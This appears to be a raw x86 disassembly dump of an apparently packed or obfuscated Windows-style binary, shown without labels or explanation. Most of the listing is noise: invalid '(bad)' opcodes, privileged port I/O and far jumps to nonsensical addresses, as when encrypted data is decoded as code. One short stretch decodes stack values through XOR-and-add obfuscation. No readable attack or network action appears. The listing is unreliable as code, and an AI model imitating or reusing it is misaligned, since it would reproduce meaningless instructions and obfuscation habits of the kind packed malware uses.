  416bda:	jge    0x416b75
  416bdc:	jo     0x416b5f
  416bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bdf:	fwait
  416be0:	in     eax,0xa3
  416be2:	inc    edi
  416be3:	and    DWORD PTR ds:0x35ef4922,ecx
  416be9:	jle    0x416c1a
  416beb:	into   
  416bec:	cli    
  416bed:	ja     0x416c08
  416bef:	inc    eax
  416bf0:	adc    DWORD PTR [edi],ecx
  416bf2:	fucom  st(2)
  416bf4:	xor    edi,DWORD PTR [ecx]
  416bf6:	push   esi
  416bf7:	jmp    0x416bd7
  416bf9:	xlat   BYTE PTR ds:[ebx]
  416bfa:	je     0x416c63
  416bfc:	jnp    0x416b9f
  416bfe:	mov    eax,ds:0x645395f5
  416c03:	xor    eax,esp
  416c05:	push   ecx
  416c06:	int3   
  416c07:	push   edi
  416c08:	pop    esp
  416c09:	add    esi,eax
  416c0b:	jmp    0x7ce8:0x38600a3d
  416c12:	out    0xf6,eax
  416c14:	push   ds
  416c15:	test   BYTE PTR [edi+0x7],0xa4
  416c19:	xor    ch,0xf8
  416c1c:	ret    0xa330
  416c1f:	retf   0xfb45
  416c22:	xchg   edx,eax
  416c23:	push   ds
  416c24:	scas   al,BYTE PTR es:[edi]
  416c25:	ja     0x416ba7
  416c27:	das    
  416c28:	xor    al,BYTE PTR [eax+ecx*4-0x27b91b9d]
  416c2f:	lds    ecx,FWORD PTR [ebp-0x211c1f78]
  416c35:	cli    
  416c36:	mov    al,ds:0xa0091171
  416c3b:	xchg   edi,eax
  416c3c:	xchg   ecx,eax
  416c3d:	mov    ?,WORD PTR [ebx]
  416c3f:	lods   al,BYTE PTR ds:[esi]
  416c40:	out    dx,eax
  416c41:	ja     0x416c21
  416c43:	(bad)  
  416c45:	jge    0x416bd7
  416c47:	cld    
  416c48:	cld    
  416c49:	mov    DWORD PTR [ebx-0x63],ecx
  416c4c:	dec    ecx
  416c4d:	mov    al,0x19
  416c4f:	pop    esp
  416c50:	and    al,0x56
  416c52:	add    DWORD PTR [edi+0x70],eax
  416c55:	(bad)  [eax+esi*1-0x2e932db7]
  416c5c:	mov    al,0xc8
  416c5e:	jle    0x416bed
  416c60:	mov    WORD PTR [ebp-0x5f8ef3d],ss
  416c66:	jl     0x416c94
  416c68:	popa   
  416c69:	add    bh,0x26
  416c6c:	xlat   BYTE PTR ds:[ebx]
  416c6d:	aam    0xc8
  416c6f:	lods   al,BYTE PTR ds:[esi]
  416c70:	push   0x7c22fda7
  416c75:	xchg   edx,eax
  416c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c77:	leave  
  416c78:	aas    
  416c79:	mov    ah,0x3b
  416c7b:	push   ss
  416c7c:	dec    ebx
  416c7d:	inc    esp
  416c7e:	(bad)  
  416c7f:	sub    eax,0xbb928b8b
  416c84:	inc    eax
  416c85:	shl    ebx,0x7a
  416c88:	sbb    DWORD PTR [eax+0x4],0x48cb790f
  416c8f:	dec    edi
  416c90:	fimul  WORD PTR [ecx]
  416c92:	lea    ebx,[ecx]
  416c94:	sti    
  416c95:	add    ah,BYTE PTR [edx]
  416c97:	push   ecx
  416c98:	shr    BYTE PTR [edx-0x42],0x37
  416c9c:	shl    DWORD PTR [eax-0x784386f6],cl
  416ca2:	push   edi
  416ca3:	cmp    DWORD PTR [ecx+eax*8+0x5788592b],ebx
  416caa:	cdq    
  416cab:	arpl   WORD PTR [ebx],bp
  416cad:	sub    eax,0x111ac60b
  416cb2:	pop    ecx
  416cb3:	out    dx,eax
  416cb4:	mov    ebp,0x296a53f9
  416cb9:	ficomp WORD PTR [eax+0x69]
  416cbc:	add    eax,0x98f48c69
  416cc1:	ins    DWORD PTR es:[edi],dx
  416cc2:	(bad)  
  416cc3:	jo     0x416c71
  416cc5:	xor    bh,ah
  416cc7:	hlt    
  416cc8:	jecxz  0x416cee
  416cca:	lock xchg esp,eax
  416ccc:	jge    0x416ca6
  416cce:	push   cs
  416ccf:	dec    edi
  416cd0:	jge    0x416cf1
  416cd2:	outs   dx,DWORD PTR ds:[esi]
  416cd3:	cmp    bl,BYTE PTR [ecx-0xe2e5229]
  416cd9:	pusha  
  416cda:	aas    
  416cdb:	es jmp 0xeca74b63
  416ce1:	mov    eax,ds:0x7b246406
  416ce6:	pop    esp
  416ce7:	inc    ecx
  416ce8:	dec    ebx
  416ce9:	mov    edx,0x3378b6d2
  416cee:	imul   eax,ebx,0xe9a7e444
  416cf4:	and    DWORD PTR [eax-0x40],edi
  416cf7:	jns    0x416d45
  416cf9:	scas   al,BYTE PTR es:[edi]
  416cfa:	stc    
  416cfb:	or     DWORD PTR [ecx-0x89c72ae],ebp
  416d01:	fiadd  WORD PTR [eax-0x3b]
  416d04:	sbb    ah,BYTE PTR [edx-0x188db69e]
  416d0a:	inc    edi
  416d0b:	add    edi,esp
  416d0d:	mov    ah,0xf3
  416d0f:	sbb    eax,0xa04ee18f
  416d14:	jns    0x416d54
  416d16:	(bad)  
  416d18:	mov    ds:0x371ea6a8,al
  416d1d:	lea    ebx,[ebp-0x66]
  416d20:	jmp    0x915b207f
  416d25:	test   al,0x1b
  416d27:	aaa    
  416d28:	inc    eax
  416d29:	in     eax,dx
  416d2a:	cmp    BYTE PTR [ebx-0x296be5c4],dl
  416d30:	cmp    DWORD PTR [edx],esp
  416d32:	mov    ebp,0x1458d55f
  416d37:	xor    esi,esp
  416d39:	stos   DWORD PTR es:[edi],eax
  416d3a:	sbb    al,0x82
  416d3c:	pop    ebp
  416d3d:	mov    ah,0x80
  416d3f:	pop    ebp
  416d40:	pop    ss
  416d41:	cld    
  416d42:	add    cl,dl
  416d44:	mov    WORD PTR [eax-0x110ecc4f],gs
  416d4a:	lods   eax,DWORD PTR ds:[esi]
  416d4b:	mov    edi,0xe68490f3
  416d50:	pop    edi
  416d51:	pop    ecx
  416d52:	stc    
  416d53:	rol    DWORD PTR [ebx],1
  416d55:	mov    ds:0x7edc6f73,al
  416d5a:	push   esi
  416d5b:	or     eax,0x9ad0fed4
  416d60:	mov    bh,0x24
  416d62:	(bad)  
  416d63:	in     al,dx
  416d64:	mov    cl,0x20
  416d66:	fsub   QWORD PTR [ebp-0x5b]
  416d69:	icebp  
  416d6a:	shl    DWORD PTR [ecx-0x7],0xcb
  416d6e:	push   ecx
  416d6f:	fs sbb ebp,ecx
  416d72:	xchg   ebp,eax
  416d73:	loopne 0x416d1b
  416d75:	lahf   
  416d76:	xchg   ebx,eax
  416d77:	pop    esp
  416d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d79:	pop    ecx
  416d7a:	xchg   edx,eax
  416d7b:	call   0x6897:0x462ab176
  416d82:	jle    0x416d8f
  416d84:	imul   eax,eax,0xfe567ad2
  416d8a:	loopne 0x416dbd
  416d8c:	cld    
  416d8d:	jge    0x416d14
  416d8f:	test   BYTE PTR [ecx-0x1539c07a],dl
  416d95:	mov    ah,0x3c
  416d97:	jns    0x416da1
  416d99:	loopne 0x416de5
  416d9b:	inc    eax
  416d9c:	pop    edx
  416d9d:	jmp    0x416dbc
  416d9f:	test   BYTE PTR [edx-0x4a],dh
  416da2:	in     al,dx
  416da3:	out    0x70,eax
  416da5:	js     0x416de7
  416da7:	cld    
  416da8:	fdivr  st(6),st
  416daa:	out    0xd,eax
  416dac:	lods   eax,DWORD PTR ds:[esi]
  416dad:	repnz retf 0x538a
  416db1:	enter  0x343d,0x4
  416db5:	xlat   BYTE PTR ds:[ebx]
  416db6:	push   esi
  416db7:	jno    0x416e24
  416db9:	pop    edi
  416dba:	les    esi,FWORD PTR [esi]
  416dbc:	mov    eax,gs
  416dbe:	cmp    DWORD PTR [ebx+0x616bb83],esi
  416dc4:	mov    eax,ds:0x65f29b04
  416dc9:	xor    BYTE PTR [edx],dl
  416dcb:	sar    BYTE PTR [ecx+0x2c],1
  416dce:	cmp    BYTE PTR ds:0x166ed7e4,al
  416dd4:	sbb    eax,0x433582dd
  416dd9:	push   ds
  416dda:	mov    ecx,0x669673e
  416ddf:	(bad)  
  416de0:	or     al,0x58
  416de2:	fwait
  416de3:	jp     0x416e11
  416de5:	sbb    DWORD PTR [edi-0x59ce836d],esi
  416deb:	out    dx,al
  416dec:	es ja  0x416e22
  416def:	(bad)  
  416df0:	add    eax,edi
  416df2:	add    edx,edi
  416df4:	imul   eax,edx
  416df7:	add    eax,DWORD PTR [ebp-0xc]
  416dfa:	mov    DWORD PTR [ebp-0xc],eax
  416dfd:	mov    eax,DWORD PTR [ebp-0xc]
  416e00:	mov    edx,DWORD PTR [ebp-0x20]
  416e03:	sub    eax,edi
  416e05:	sub    edx,edi
  416e07:	xor    eax,esi
  416e09:	xor    edx,esi
  416e0b:	cmp    edx,eax
  416e0d:	jne    0x4102d1
  416e13:	mov    eax,DWORD PTR [ebp-0x1c]
  416e16:	mov    edx,DWORD PTR [ebp-0x20]
  416e19:	xor    eax,esi
  416e1b:	add    eax,edi
  416e1d:	imul   eax,edx
  416e20:	mov    edx,DWORD PTR [ebp-0x24]
  416e23:	xor    edx,esi
  416e25:	add    edx,edi
  416e27:	or     eax,edx
  416e29:	mov    edx,DWORD PTR [ebp-0x18]
  416e2c:	xor    edx,esi
  416e2e:	add    eax,edx
  416e30:	mov    edx,DWORD PTR [ebp-0x18]
  416e33:	xor    edx,esi
  416e35:	add    eax,edx
  416e37:	mov    edx,DWORD PTR [ebp-0x10]
  416e3a:	lea    eax,[eax+edx*1+0x64e5b6]
  416e41:	jmp    0x4191ca
  416e46:	jmp    0x4191bb
  416e4b:	push   ebx
  416e4c:	ja     0x416e99
  416e4e:	cmp    BYTE PTR [ebx],ch
  416e50:	add    al,0xe3
  416e52:	adc    esp,ebp
  416e54:	xchg   edx,eax
  416e55:	push   edx
  416e56:	mov    al,0xa
  416e58:	pushf  
  416e59:	in     al,0x9b
  416e5b:	mov    bh,0x24
  416e5d:	popa   
  416e5e:	bound  ecx,QWORD PTR [edx]
  416e60:	pop    edi
  416e61:	bound  esp,QWORD PTR [edx-0x3c]
  416e64:	jecxz  0x416e73
  416e66:	sbb    al,0x62
  416e68:	push   ecx
  416e69:	(bad)  
  416e6a:	fidivr DWORD PTR [ebp+edi*2-0xf62462d]
  416e71:	xor    ecx,DWORD PTR [eax+edi*8-0x721309be]
  416e78:	xor    al,0x21
  416e7a:	(bad)  
  416e7b:	adc    DWORD PTR [ecx],edx
  416e7d:	pop    ecx
  416e7e:	dec    eax
  416e7f:	pusha  
  416e80:	mov    ecx,0x539bf34b
  416e85:	repz xlat BYTE PTR ds:[ebx]
  416e87:	xchg   ebx,eax
  416e88:	mov    esi,DWORD PTR [edx]
  416e8a:	shr    DWORD PTR [esi*4-0x2eb4d792],1
  416e91:	push   ebp
  416e92:	(bad)  
  416e93:	sbb    eax,0xe8b82d6f
  416e98:	mov    al,ds:0xbbd54974
  416e9d:	aam    0x84
  416e9f:	int3   
  416ea0:	pushf  
  416ea1:	pop    ds
  416ea2:	add    eax,0xdf4d569e
  416ea7:	xor    eax,0xf8249e0
  416eac:	inc    ecx
  416ead:	je     0x416e74
  416eaf:	jl     0x416e81
  416eb1:	or     eax,0xf20ba435
  416eb6:	sar    BYTE PTR [edi],1
  416eb8:	(bad)  
  416eb9:	and    al,0x92
  416ebb:	imul   ebx,DWORD PTR [ecx+0x20acb74],0x81339f34
  416ec5:	or     eax,0xb9d2c41c
  416eca:	add    DWORD PTR [edi-0x6e2b0dea],0xffffffdf
  416ed1:	and    al,0x0
  416ed3:	stc    
  416ed4:	inc    edi
  416ed5:	fucomi st,st(6)
  416ed7:	repz cmc 
  416ed9:	xor    DWORD PTR [ebp+0x76cbf252],0x5c73a5f5
  416ee3:	mov    edx,0xe0984f81
  416ee8:	jb     0x416ea3
  416eea:	jecxz  0x416e6f
  416eec:	add    BYTE PTR [ebx+ebx*1],dh
  416eef:	fstp   st(6)
  416ef1:	jnp    0x416eef
  416ef3:	pop    esp
  416ef4:	pop    edx
  416ef5:	mov    esi,0xcf5e7086
  416efa:	pop    esp
  416efb:	jbe    0x416ece
  416efd:	shl    ebp,cl
  416eff:	push   ecx
  416f00:	scas   eax,DWORD PTR es:[edi]
  416f01:	aaa    
  416f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f03:	(bad)  
  416f04:	pushf  
  416f05:	sub    DWORD PTR [edx+0x577d4d7a],ecx
  416f0b:	jbe    0x416f31
  416f0d:	or     eax,0x2e403a65
  416f12:	sub    BYTE PTR [edx+0x3604aa3d],0x43
  416f19:	pop    edx
  416f1a:	mov    WORD PTR [edi+eiz*1-0x3802d7c0],gs
  416f21:	mov    dh,0x3f
  416f23:	sbb    DWORD PTR [edx-0x37],ebx
  416f26:	gs xchg edi,eax
  416f28:	and    al,0xf0
  416f2a:	in     al,dx
  416f2b:	imul   ecx,ecx,0x6f
  416f2e:	stc    
  416f2f:	push   cs
  416f30:	mov    bh,0xb
  416f32:	inc    eax
  416f33:	jge    0x416f7e
  416f35:	fild   DWORD PTR [edx-0x60]
  416f38:	test   eax,0x476098aa
  416f3d:	cwde   
  416f3e:	mov    cl,0xeb
  416f40:	or     eax,eax
  416f42:	pop    ds
  416f43:	jno    0x416ecb
  416f45:	sub    BYTE PTR [ebx-0x80],0xa6
  416f49:	mov    bl,BYTE PTR [eax-0x73]
  416f4c:	jmp    0x7768:0x54f1c1f8
  416f53:	leave  
  416f54:	mov    al,ds:0xddec30f4
  416f59:	mov    eax,ds:0x7a3065b0
  416f5e:	js     0x416f0b
  416f60:	push   ds
  416f61:	sub    esi,DWORD PTR [edi]
  416f63:	sbb    al,0xda
  416f65:	pop    ebp
  416f66:	loope  0x416f8b
  416f68:	retf   
  416f69:	jle    0x416ef4
  416f6b:	or     BYTE PTR [esi+esi*4-0x2073df86],dh
  416f72:	pop    esp
  416f73:	arpl   sp,cx
  416f75:	pop    edx
  416f76:	cs scas al,BYTE PTR es:[edi]
  416f78:	push   ss
  416f79:	xchg   esp,eax
  416f7a:	and    al,0x84
  416f7c:	jns    0x416fac
  416f7e:	push   eax
  416f7f:	jg     0x416ff6
  416f81:	nop
  416f82:	adc    ecx,eax
  416f84:	sahf   
  416f85:	aad    0x86
  416f87:	xchg   edi,eax
  416f88:	mov    ds:0x629c4878,eax
  416f8d:	lea    edi,[eax]
  416f8f:	pop    esi
  416f90:	dec    ecx
  416f91:	pop    ebp
  416f92:	addr16 leave 
  416f94:	cdq    
  416f95:	or     esp,DWORD PTR [eax-0x4f]
  416f98:	push   es
  416f99:	das    
  416f9a:	and    eax,0xad7e95a6
  416f9f:	retf   0xab72
  416fa2:	dec    edi
  416fa3:	push   cs
  416fa4:	xor    BYTE PTR [esi+0x25],ch
  416fa7:	shr    BYTE PTR [ebx-0x2c],1
  416faa:	inc    ebp
  416fab:	add    edi,edi
  416fad:	inc    esp
  416fae:	sub    al,0x4e
  416fb0:	xor    ebx,ecx
  416fb2:	int    0xdb
  416fb4:	stos   DWORD PTR es:[edi],eax
  416fb5:	cs in  eax,0x65
  416fb8:	aas    
  416fb9:	cs pop ebp
  416fbb:	and    DWORD PTR [ebp+0x48d676a1],esp
  416fc1:	sbb    eax,0xc420033f
  416fc6:	pop    esi
  416fc7:	sbb    BYTE PTR [ebp+edi*8+0x3b9cfa80],ah
  416fce:	mov    bl,0xdd
  416fd0:	and    dh,BYTE PTR [ebx]
  416fd2:	lods   eax,DWORD PTR ds:[esi]
  416fd3:	adc    bl,0x73
  416fd6:	mov    eax,0xd4c6b9f3
  416fdb:	test   eax,0x6c7a8f78
  416fe0:	ja     0x416fec
  416fe2:	mov    dl,0x98
  416fe4:	xchg   DWORD PTR [ebx-0x32aa9269],edx
  416fea:	push   ds
  416feb:	test   al,0x7e
  416fed:	cld    
  416fee:	daa    
  416fef:	inc    ecx
  416ff0:	inc    esi
  416ff1:	fbld   TBYTE PTR [esi+eax*2]
  416ff4:	jmp    0x4bd3554c
  416ff9:	mov    al,0xdd
  416ffb:	nop
  416ffc:	std    
  416ffd:	sbb    al,0xc3
  416fff:	rol    BYTE PTR [eax+0x18e084ea],1
  417005:	xor    al,0x7c
  417007:	dec    ebp
  417008:	xor    al,BYTE PTR [ebx]
  41700a:	call   0x8524:0x1fecdace
  417011:	das    
  417012:	retf   0x96ca
  417015:	sbb    edi,DWORD PTR [edx+0x2a]
  417018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417019:	or     BYTE PTR [edx+0x58490e5a],0x2
  417020:	mov    eax,ds:0xe0c24345
  417025:	push   ebp
  417026:	fwait
  417027:	pop    ds
  417028:	dec    ecx
  417029:	cmp    esi,DWORD PTR [esp+edi*4+0x65af3805]
  417030:	fnstsw WORD PTR [ecx-0x5cc88660]
  417036:	ret    0xd8da
  417039:	add    dl,al
  41703b:	adc    cl,cl
  41703d:	sub    eax,0xbfed0925
  417042:	stos   BYTE PTR es:[edi],al
  417043:	sub    BYTE PTR [edx],cl
  417045:	call   0x76716aa6
  41704a:	mov    ds:0xedcf8e5b,eax
  41704f:	test   BYTE PTR [edx-0x33a6c856],dl
  417055:	jmp    0x8ce5:0xdbb546eb
  41705c:	mov    esp,0xa56c9741
  417061:	call   0xe43ba0a
  417066:	add    edx,DWORD PTR [ebp-0x4826383a]
  41706c:	xchg   BYTE PTR [edx-0x1b1b4cbf],ch
  417072:	fwait
  417073:	in     eax,dx
  417074:	aaa    
  417075:	shl    edx,1
  417077:	outs   dx,BYTE PTR ds:[esi]
  417078:	cmp    DWORD PTR [edx],esi
  41707a:	popf   
  41707b:	pop    esp
  41707c:	pop    esp
  41707d:	add    ecx,DWORD PTR [esi+0x70]
  417080:	jmp    0x417092
  417082:	push   esi
  417083:	cmp    BYTE PTR [edi],al
  417085:	push   es
  417086:	in     al,0x8a
  417088:	ins    DWORD PTR es:[edi],dx
  417089:	xchg   ecx,eax
  41708a:	fisub  WORD PTR [edi+0x58]
  41708d:	div    BYTE PTR [ecx]
  41708f:	out    0x80,al
  417091:	jno    0x417105
  417093:	(bad)  
  417094:	fbstp  TBYTE PTR [edi+0x1bd1f421]
  41709a:	adc    al,0x89
  41709c:	jo     0x41710a
  41709e:	cdq    
  41709f:	lock int3 
  4170a1:	hlt    
  4170a2:	fwait
  4170a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170a4:	inc    esi
  4170a5:	xor    al,0x6e
  4170a7:	and    edi,ecx
  4170a9:	cmp    DWORD PTR [eax+0x700ef9f0],ebx
  4170af:	sub    al,0xec
  4170b1:	mov    dh,0xb7
  4170b3:	jae    0x417056
  4170b5:	mov    ebx,0xba980bf5
  4170ba:	das    
  4170bb:	jne    0x4170e7
  4170bd:	push   esi
  4170be:	aas    
  4170bf:	scas   eax,DWORD PTR es:[edi]
  4170c0:	xchg   DWORD PTR [ecx-0x2c1fa988],edi
  4170c6:	test   dl,0x21
  4170c9:	adc    edi,DWORD PTR [edx+0x4e]
  4170cc:	in     eax,dx
  4170cd:	bnd ret 
  4170cf:	sub    DWORD PTR [edx],esp
  4170d1:	sbb    ch,BYTE PTR [ebx]
  4170d3:	pop    ss
  4170d4:	push   ecx
  4170d5:	xchg   al,ch
  4170d7:	or     DWORD PTR ds:0xcd47cd83,edi
  4170dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170de:	xor    al,0x1e
  4170e0:	(bad)  
  4170e1:	out    0xc5,al
  4170e3:	xor    DWORD PTR [ecx],esp
  4170e5:	push   esi
  4170e6:	jmp    0xf88a:0x2b208e8f
  4170ed:	dec    ebp
  4170ee:	inc    esp
  4170ef:	mov    ebx,0x1dc28b7
  4170f4:	fsub   QWORD PTR [edx+ebx*2-0x63549a7d]
  4170fb:	push   cs
  4170fc:	frstor ds:0x8e7817a0
  417102:	xchg   ecx,eax
  417103:	dec    eax
  417104:	int    0x85
  417106:	icebp  
  417107:	or     esi,edx
  417109:	das    
  41710a:	push   ds
  41710b:	cmp    eax,0x484ba356
  417110:	inc    ebx
  417111:	lds    edx,FWORD PTR [edx-0x17]
  417114:	popa   
  417115:	(bad)  
  417116:	in     al,0x47
  417118:	adc    al,0x7
  41711a:	cmc    
  41711b:	ins    BYTE PTR es:[edi],dx
  41711c:	cmp    BYTE PTR [ecx+0x157f15aa],0x3c
  417123:	fstp   DWORD PTR [edi+0xb]
  417126:	adc    BYTE PTR [ebx+ebx*8+0x5315698],bh
  41712d:	dec    esp
  41712e:	dec    edx
  41712f:	retf   0x64b9
  417132:	jl     0x41717f
  417134:	dec    ebp
  417135:	ja     0x417163
  417137:	cmp    al,0x2f
  417139:	jne    0x4171b1
  41713b:	ret    
  41713c:	jno    0x417189
  41713e:	jge    0x417146
  417140:	fadd   QWORD PTR [ebx-0x71]
  417143:	jmp    0x96db:0xecdf34f7
  41714a:	cmp    cl,bl
  41714c:	in     eax,0x88
  41714e:	xor    DWORD PTR fs:[edi+0x44],0x69
  417153:	jnp    0x4170e6
  417155:	sti    
  417156:	or     al,0xb1
  417158:	mov    eax,ds:0xda4f243b
  41715d:	push   ss
  41715e:	ret    
  41715f:	cmp    al,BYTE PTR [ebp-0x12]
  417162:	sbb    DWORD PTR ss:0x668f2b87,ebx
  417169:	or     eax,edi
  41716b:	cdq    
  41716c:	repz cmp BYTE PTR [esi],ah
  41716f:	mov    ah,0x1a
  417171:	lods   eax,DWORD PTR ds:[esi]
  417172:	push   ecx
  417173:	cmp    DWORD PTR [ebx-0x13],ebp
  417176:	hlt    
  417177:	retf   
  417178:	jb     0x417115
  41717a:	add    edi,DWORD PTR [ecx+0x4]
  41717d:	push   0xd8acd49e
  417182:	fs pop ebx
  417184:	sub    al,0x4d
  417186:	stc    
  417187:	sbb    dh,0x5f
  41718a:	cmp    al,0xc2
  41718c:	loop   0x4171aa
  41718e:	test   eax,0x31276f12
  417193:	scas   eax,DWORD PTR es:[edi]
  417194:	jbe    0x417119
  417196:	jns    0x417122
  417198:	hlt    
  417199:	jbe    0x417171
  41719b:	cs leave 
  41719d:	add    edi,DWORD PTR [eax+0x36]
  4171a0:	sbb    eax,esp
  4171a2:	jne    0x4171c3
  4171a4:	dec    edi
  4171a5:	sbb    cl,dl
  4171a7:	std    
  4171a8:	xor    ebx,0x33
  4171ab:	xchg   ebp,eax
  4171ac:	loop   0x417217
  4171ae:	cmp    al,0x4d
  4171b0:	xor    al,0xdd
  4171b2:	sar    ebp,cl
  4171b4:	lea    edi,[eax]
  4171b6:	fld    DWORD PTR [ebp-0x61]
  4171b9:	sbb    edi,ebp
  4171bb:	stos   BYTE PTR es:[edi],al
  4171bc:	push   ecx
  4171bd:	push   cs
  4171be:	gs inc esi
  4171c0:	(bad)  
  4171c2:	stos   BYTE PTR es:[edi],al
  4171c3:	retf   
  4171c4:	xor    DWORD PTR [edi+0x3507e549],ebx
  4171ca:	lods   eax,DWORD PTR ss:[esi]
  4171cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171cd:	imul   edx,edx,0xb33f1dfc
  4171d3:	push   ds
  4171d4:	fdiv   DWORD PTR [ecx-0xb]
  4171d7:	inc    edx
  4171d8:	retf   
  4171d9:	dec    BYTE PTR [ebp+0x7c712745]
  4171df:	and    eax,0x7baa22a2
  4171e4:	jae    0x417228
  4171e6:	data16 and dl,BYTE PTR [ebx-0x63ae4213]
  4171ed:	out    0xc1,al
  4171ef:	cmp    ebx,esi
  4171f1:	lods   eax,DWORD PTR ds:[esi]
  4171f2:	inc    esi
  4171f3:	mov    edi,0x8fdf9b76
  4171f8:	jmp    0x12f2:0xab70bfd4
  4171ff:	cmp    eax,0xc987d149
  417204:	out    0x72,al
  417206:	inc    esp
  417207:	push   es
  417208:	push   ebp
  417209:	jmp    0x4171ff
  41720b:	or     ch,0xb
  41720e:	and    esi,DWORD PTR [esi-0x28]
  417211:	adc    esi,DWORD PTR [ebx]
  417213:	inc    esp
  417214:	cdq    
  417215:	pusha  
  417216:	dec    ebp
  417217:	je     0x417278
  417219:	gs add BYTE PTR fs:[ecx+0x2209e8c1],dl
  417221:	in     al,0x64
  417223:	xchg   edx,eax
  417224:	rcl    BYTE PTR [ecx],1
  417226:	(bad)  
  417227:	fsubr  st,st(6)
  417229:	inc    ebp
  41722a:	pop    esi
  41722b:	idiv   dl
  41722d:	mov    ds:0x4c031fdc,eax
  417232:	xchg   DWORD PTR [esi],ebp
  417234:	outs   dx,BYTE PTR ds:[esi]
  417235:	sbb    eax,0xb218f6d3
  41723a:	jg     0x4171ee
  41723c:	aaa    
  41723d:	shl    BYTE PTR [eax],1
  41723f:	mov    al,ds:0x89466f08
  417244:	jb     0x417261
  417246:	sahf   
  417247:	jno    0x4172ba
  417249:	sti    
  41724a:	mov    ds:0xd09dcfa3,eax
  41724f:	add    al,0x61
  417251:	outs   dx,BYTE PTR ds:[esi]
  417252:	out    0xf9,eax
  417254:	int3   
  417255:	mov    esp,0xa6540ab1
  41725a:	(bad)
  41725d:	jne    0x417267
  41725f:	and    DWORD PTR [ebx+0x60ae10cb],ecx
  417265:	fsubr  DWORD PTR [eax-0x4d]
  417268:	sar    BYTE PTR [edi-0x6afaea4f],cl
  41726e:	jmp    0xbbf8435c
  417273:	cdq    
  417274:	pop    edx
  417275:	mov    ebp,0x678e1dd5
  41727a:	and    esi,ebp
  41727c:	bound  ecx,QWORD PTR [ebp-0x674d5e56]
  417282:	test   DWORD PTR [edx+0x281bf70a],ebx
  417288:	je     0x417302
  41728a:	cmp    ecx,DWORD PTR [eax+0x54b213a0]
  417290:	add    dl,BYTE PTR [esi-0x41]
  417293:	add    bl,BYTE PTR [esi]
  417295:	clc    
  417296:	sbb    eax,0x79f43498
  41729b:	cli    
  41729c:	imul   ebx,DWORD PTR [eax+eiz*8-0x4ec385f4],0x19
  4172a4:	mov    ds:0x1b44854b,al
  4172a9:	and    dl,bl
  4172ab:	retf   0x9b34
  4172ae:	in     al,0x79
  4172b0:	test   bh,0xca
  4172b3:	sahf   
  4172b4:	mov    esp,0x694f3dd5
  4172b9:	sub    al,0x87
  4172bb:	cwde   
  4172bc:	rol    DWORD PTR [esi-0x6bc28453],cl
  4172c2:	loopne 0x4172c8
  4172c4:	mov    esi,0xb17cf880
  4172c9:	pop    esp
  4172ca:	add    eax,0x552f8c0e
  4172cf:	mov    fs,WORD PTR [esi]
  4172d1:	sbb    eax,DWORD PTR [esi+0x7f]
  4172d4:	cmp    dl,BYTE PTR [ebp+0x2b]
  4172d7:	shl    BYTE PTR [esi+0x16],cl
  4172da:	or     al,0x0
  4172dc:	out    0xb0,al
  4172de:	mov    ch,0xbe
  4172e0:	mov    al,ds:0x87690554
  4172e5:	mov    eax,0xa1f62337
  4172ea:	push   esi
  4172eb:	mov    ecx,0x8725ce4c
  4172f0:	(bad)  
  4172f1:	xor    eax,0x53217169
  4172f6:	ins    BYTE PTR es:[edi],dx
  4172f7:	fld    DWORD PTR [edi+0x4ab8e5fb]
  4172fd:	pop    ds
  4172fe:	push   cs
  4172ff:	add    bh,BYTE PTR [ecx+0xb0ac436]
  417305:	pop    ecx
  417306:	xor    esp,DWORD PTR [eax]
  417308:	push   es
  417309:	jo     0x417316
  41730b:	into   
  41730c:	or     esi,DWORD PTR [ebx]
  41730e:	push   ds
  41730f:	xor    al,0xb9
  417311:	sbb    ebp,DWORD PTR [ebp-0x38c79539]
  417317:	sbb    edx,edx
  417319:	aam    0xc9
  41731b:	jmp    0x273a8502
  417320:	std    
  417321:	inc    ecx
  417322:	sti    
  417323:	mov    ds:0xaac21b3d,eax
  417328:	mov    al,0xa
  41732a:	sbb    al,BYTE PTR [edx-0x74d7914f]
  417330:	pop    ss
  417331:	clc    
  417332:	retf   
  417333:	ss push esp
  417335:	xchg   ebx,eax
  417336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417337:	leave  
  417338:	mov    edi,0x1dc6d4b4
  41733d:	test   BYTE PTR [esi-0x602509a5],dl
  417343:	mov    ds:0x6326d0ba,eax
  417348:	hlt    
  417349:	mov    esi,0xc0587899
  41734e:	cmp    dh,cl
  417350:	imul   cl
  417352:	jecxz  0x417364
  417354:	lods   al,BYTE PTR ds:[esi]
  417355:	dec    ecx
  417356:	jbe    0x4173d1
  417358:	outs   dx,BYTE PTR ds:[esi]
  417359:	iret   
  41735a:	jmp    0xd57b:0x83d0b77b
  417361:	imul   ebp,esp,0xffffffaa
  417364:	mov    al,0xcd
  417366:	cmc    
  417367:	mov    edi,esp
  417369:	and    ecx,DWORD PTR [edx+0x41]
  41736c:	outs   dx,DWORD PTR ds:[esi]
  41736d:	inc    ebx
  41736e:	cmp    BYTE PTR [ebp+edx*4-0x15],dh
  417372:	aad    0xed
  417374:	cmp    BYTE PTR [edx-0x7f],ah
  417377:	mov    dl,0xe5
  417379:	mov    bh,0xeb
  41737b:	retf   
  41737c:	push   0xe46604e8
  417381:	cmp    ch,BYTE PTR [ebp-0x1f706d5c]
  417387:	dec    ebx
  417388:	icebp  
  417389:	mov    eax,0xead89614
  41738e:	data16 mov ds:0x2518b23e,al
  417394:	xor    DWORD PTR [ebx-0x74],edi
  417397:	hlt    
  417398:	jg     0x4173eb
  41739a:	add    DWORD PTR [ebp-0x19],esp
  41739d:	mov    ah,dl
  41739f:	cmp    DWORD PTR [ebp+0x4b579053],edi
  4173a5:	aas    
  4173a6:	inc    edx
  4173a7:	fisub  WORD PTR [edi+eiz*4+0x5542b936]
  4173ae:	ins    BYTE PTR es:[edi],dx
  4173af:	jmp    0x417391
  4173b1:	int    0x6
  4173b3:	push   ecx
  4173b4:	fcomi  st,st(1)
  4173b6:	xor    al,0x10
  4173b8:	jl     0x41733d
  4173ba:	(bad)  
  4173bb:	jmp    0x1850:0x26e6bd81
  4173c2:	mov    edx,0x778dc4ad
  4173c7:	aas    
